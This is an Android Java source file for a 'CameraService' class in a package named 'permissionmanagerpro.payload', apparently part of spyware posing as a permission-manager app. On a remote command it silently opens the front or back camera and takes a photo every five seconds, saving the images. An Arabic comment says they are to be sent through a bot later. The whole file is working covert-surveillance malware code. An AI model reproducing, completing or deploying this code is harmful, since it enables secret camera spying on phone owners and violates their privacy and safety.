package com.example.permissionmanagerpro.payload;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;

import java.io.File;
import java.io.FileOutputStream;

public class CameraService extends Service {
    private static final String TAG = "CameraService";
    private Camera camera;
    private boolean running = true;
    private String side = "back"; // القيمة الافتراضية

    @Override
    public void onCreate() {
        super.onCreate();
        // لا نستخدم getIntent() هنا، ننتظر onStartCommand
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // نأخذ قيمة camera_side من الـ Intent الذي جاء به الأمر
        if (intent != null) {
            side = intent.getStringExtra("camera_side");
            if (side == null) side = "back";
        }

        // نبدأ تشغيل الكاميرا في خيط منفصل (يتم تشغيلها مرة واحدة فقط)
        if (camera == null) {
            new Thread(this::startCamera).start();
        }
        return START_STICKY;
    }

    private void startCamera() {
        try {
            int camId = side.equals("front") ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
            Camera.CameraInfo info = new Camera.CameraInfo();
            for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                Camera.getCameraInfo(i, info);
                if (info.facing == camId) {
                    camera = Camera.open(i);
                    break;
                }
            }
            if (camera == null) camera = Camera.open();

            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            camera.setParameters(params);
            camera.startPreview();

            while (running) {
                camera.takePicture(null, null, (data, cam) -> {
                    try {
                        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                        File f = new File(getCacheDir(), "cam_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(f);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, fos);
                        fos.close();
                        Log.d(TAG, "تم حفظ الصورة: " + f.getAbsolutePath());
                        // هنا يمكنك إرسال الصورة عبر البوت لاحقاً
                    } catch (Exception e) { e.printStackTrace(); }
                });
                Thread.sleep(5000); // كل 5 ثواني
            }
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "فشل تشغيل الكاميرا", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onDestroy() {
        running = false;
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
